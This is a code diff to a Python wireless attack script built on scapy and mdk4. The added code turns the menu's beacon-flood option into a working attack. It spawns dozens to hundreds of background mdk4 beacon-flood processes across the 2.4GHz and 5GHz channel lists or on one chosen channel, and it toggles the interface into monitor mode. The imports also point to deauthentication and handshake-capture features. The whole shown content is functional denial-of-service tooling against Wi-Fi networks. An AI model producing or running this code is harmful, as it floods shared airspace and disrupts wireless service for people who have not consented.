@@ -4,6 +4,7 @@ import time,sys,subprocess,os
 from scapy.all import Dot11, Dot11Deauth, Dot11Disas, RadioTap, Dot11Elt, sendp, sniff, conf, EAPOL, Dot11EltRSN
 
 def main():
+	Set_Monitor()
 	while True:
 		Prompt_User()
 
@@ -43,19 +44,32 @@ def Beacon_Prompt():
 	32, 36, 40, 44, 48,					# UNII-1 (Low Band)
 	52, 56, 60, 64,						# UNII-2 (Middle Band)
 	100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,	# UNII-2 Extended
-	149, 153, 157, 161, 165					# UNII-3 (High Band)
-]
+	149, 153, 157, 161, 165]				# UNII-3 (High Band)
 	bfType = input("Enter Target Channel for single channel flood, bg for 2.4GHz band flood, or a for 5GHz band flood: ")
 	if bfType.casefold() == "bg".casefold():
-		print("2.4GHz")
+		for chanIndex in range(220):
+			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
+			subprocess.run(f"mdk4 wlan0 b -c {channel_list[chanIndex%11]} > /dev/null &", shell=True, executable="/bin/bash")
+		exit = input('Input anything to end attack: ')
+		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
+		print("Ended attack on 2.4GHz Band")
 		return False
 	if bfType.casefold() == "a".casefold():
-		print("5GHz")
+		for chanIndex in range(250):
+			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
+			subprocess.run(f"mdk4 wlan0 b -c {channel_list[11+chanIndex%25]} > /dev/null &", shell=True, executable="/bin/bash")
+		exit = input('Input anything to end attack: ')
+		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
+		print("Ended attack on 5GHz Band")
 		return False
 	try:
 		channel = int(bfType)
 		if channel in channel_list:
-			print(f"Channel: {channel}")
+			for i in range(50):
+				subprocess.run(f"mdk4 wlan0 b -c {channel} > /dev/null &", shell=True, executable="/bin/bash")
+			exit = input('Input anything to end attack: ')
+			subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
+			print(f"Ended attack on {channel}")
 			return False
 		else :
 			return True
@@ -65,6 +79,7 @@ def Beacon_Prompt():
 def Exit_Script():
 	print("Ending Script")
 	subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
+	Set_Managed()
 	print("Goodbye")
 	sys.exit()
 
